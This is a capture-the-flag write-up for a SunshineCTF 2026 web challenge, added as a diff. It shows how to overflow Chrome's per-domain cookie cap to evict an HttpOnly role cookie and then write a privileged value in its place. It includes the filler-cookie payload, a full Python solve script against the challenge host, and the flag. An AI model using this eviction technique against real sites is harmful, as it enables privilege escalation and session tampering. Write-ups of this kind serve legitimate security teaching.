@@ -1,0 +1,149 @@
+---
+title: 'SunshineCTF 2026 - CookieCorp'
+description: 'Overflowing a bot browser cookie jar to evict an HttpOnly role cookie that JavaScript could not overwrite, then writing the privileged value in its place'
+date: 2026-09-30
+tags: ['writeup', 'web', 'cookie-jar-overflow', 'httponly-bypass', 'privilege-escalation', 'sunshinectf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+You submit a cookie recipe, a bot loads it, and every ingredient becomes a real cookie in the bot's browser. The bot's privilege is decided by a `role` cookie that is **HttpOnly**, so `document.cookie` cannot touch it — and the injection point hardcodes `; path=/`, which kills the usual path-shadowing trick.
+
+The way in is Chrome's per-domain cookie cap. The session cookie is pinned `Priority=High` and survives eviction; `role` is the oldest Medium-priority cookie and is the **first thing thrown out**. Blow the cap with filler, then write `role=chief` into the hole that opens up.
+
+## Challenge Description
+
+> *"A Better Cookie for a Brighter Tomorrow!"*
+>
+> Welcome to **CookieCorp**, the Space Age's finest custom-cookie fabrication service. Design a batch from any ingredients you can dream up, then submit it to our tireless robotic **Quality Inspector**. Every recipe is loaded straight into the fabrication mixer for a full inspection.
+>
+> Get your batch reviewed and you'll earn an official seal. But the truly legendary bakers — the ones whose recipes earn the **Chief's Golden Seal** — take home the grand prize.
+>
+> Only the Chief can award that seal, though. And the Chief is a very busy robot.
+
+## Initial Analysis
+
+Registration hands back two cookies, and the pair is the whole challenge:
+
+```text
+set-cookie: session=cba54309bc9cd027...; Path=/; HttpOnly; Priority=High; SameSite=Lax
+set-cookie: role=baker; Path=/; HttpOnly; SameSite=Lax
+```
+
+`session` is explicitly `Priority=High`. `role` has no priority attribute, so it defaults to Medium. Nobody writes `Priority=High` by accident.
+
+The Fabricator builds a recipe of `name=value` pairs, capped at 300 ingredients, names up to 48 characters and values up to 64. Submitting it queues the batch for the Quality Inspector. The batch page also offers an "Inspector's-eye view", which loads the exact script the bot runs:
+
+```javascript
+function dispense(ing) {
+  document.cookie = ing.name + '=' + (ing.value || '') + '; path=/';
+}
+
+async function run() {
+  for (var i = 0; i < recipe.ingredients.length; i++) {
+    dispense(recipe.ingredients[i]);
+  }
+  var resp = await fetch('/api/seal', {
+    method: 'POST',
+    headers: { 'content-type': 'application/json' },
+    credentials: 'same-origin',
+    body: JSON.stringify({ recipeId: recipe.id }),
+  });
+  result = await resp.json();
+  if (result && result.seal === 'chief') {
+    log('> GOLDEN SEAL APPLIED. batch certified by the Chief.', 'gold');
+  }
+}
+```
+
+So each ingredient is fed straight into `document.cookie`, and then `/api/seal` is called with the bot's own cookies. The server checks the session for inspector authorisation and the `role` cookie for whether a *golden* seal may be stamped — sending `role=chief` from my own account just returns `inspector authorization required`, because my session is a baker's.
+
+## The Vulnerability
+
+Two defences stand between an attacker-controlled cookie write and `role=chief`, and both look solid in isolation.
+
+**`role` is HttpOnly.** A `document.cookie` assignment that targets a name already held by an HttpOnly cookie with the same domain and path is silently discarded. The mixer cannot overwrite it.
+
+**The path is hardcoded.** The normal way around HttpOnly here is cookie shadowing: set a second cookie with the same name but a *more specific* path, so the browser sends it first and the server's parser takes the first occurrence. But `dispense` appends `; path=/` after the attacker-controlled value, so a payload of `chief; path=/api` produces:
+
+```text
+role=chief; path=/api; path=/
+```
+
+When a cookie string carries a duplicate attribute, each one overwrites the last as the parser walks left to right, so the effective path is `/` — the same path as the original, and the write is rejected again.
+
+What neither defence covers is **eviction**. Chrome caps a domain at roughly 180 cookies. When the cap is exceeded it purges by priority band — Low first, then Medium, then High — and within a band by least recently used. `session` is `Priority=High`, so it is protected. `role` is the oldest Medium cookie on the domain, so it is first in line to be deleted. And once it is gone, there is no HttpOnly cookie named `role` any more, so the mixer's `document.cookie` write lands normally.
+
+## Exploitation
+
+The recipe is 200 tiny filler ingredients to blow the cap, then `role=chief` **last**:
+
+```python
+FILL = [{'name': f'c{i:03d}', 'value': '1'} for i in range(200)]
+ings = FILL + [{'name': 'role', 'value': 'chief'}]
+```
+
+Order matters. The fillers have to be dispensed before `role=chief`, because the write only succeeds once the HttpOnly original has already been evicted.
+
+Size matters too, and this is where the first attempt failed. Using 299 ingredients with 48-byte names and 64-byte values does overflow the jar — but it also makes the outgoing `Cookie` header enormous, and `/api/seal` is rejected outright before it ever runs. The batch comes back marked `reviewed` with **no seal at all**, which looks like the exploit silently failing rather than the request being refused:
+
+```text
+Status: reviewed     Ingredients: 300
+(no seal block rendered)
+```
+
+Overflow by **count**, not by bytes. Two hundred four-byte names stay well inside any header limit while still clearing the ~180 cookie cap:
+
+```text
+alloc status ok
+GOLDEN SEAL — batch certified by the Chief
+sun{c00kie_jar_0verfl0w_ev1cts_the_chief}
+```
+
+## Solve Script
+
+```python
+import urllib.request, urllib.parse, http.cookiejar, json, re, time
+
+B = "https://tomorrow.web.2026.sunshinectf.games"
+jar = http.cookiejar.CookieJar()
+op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
+
+def api(path, obj=None, method=None):
+    data = json.dumps(obj).encode() if obj is not None else None
+    r = urllib.request.Request(B + path, data=data, method=method or ("POST" if data else "GET"))
+    if data is not None:
+        r.add_header("content-type", "application/json")
+    try:
+        return json.loads(op.open(r, timeout=30).read().decode())
+    except urllib.error.HTTPError as e:
+        return json.loads(e.read().decode() or "{}")
+
+def page(path):
+    return op.open(B + path, timeout=30).read().decode()
+
+api("/register", {"username": "kudabaker", "password": "Sp4ceC00kie!"})
+api("/login",    {"username": "kudabaker", "password": "Sp4ceC00kie!"})
+
+# 200 tiny cookies to blow Chrome's ~180-per-domain cap, then the real write.
+# Fillers first: role=chief only lands once the HttpOnly original is evicted.
+FILL = [{"name": f"c{i:03d}", "value": "1"} for i in range(200)]
+r = api("/api/recipe", {"title": "Count Overflow",
+                        "ingredients": FILL + [{"name": "role", "value": "chief"}]})
+rid = r["id"]
+
+op.open(urllib.request.Request(B + f"/api/recipe/{rid}/submit", data=b"", method="POST"))
+
+for _ in range(5):
+    time.sleep(6)
+    b = page("/recipe/" + rid)
+    m = re.search(r"sun\{[^}]+\}", b)
+    if m:
+        print(m.group(0)); break
+```
+
+## Flag
+
+```text
+sun{c00kie_jar_0verfl0w_ev1cts_the_chief}
+```
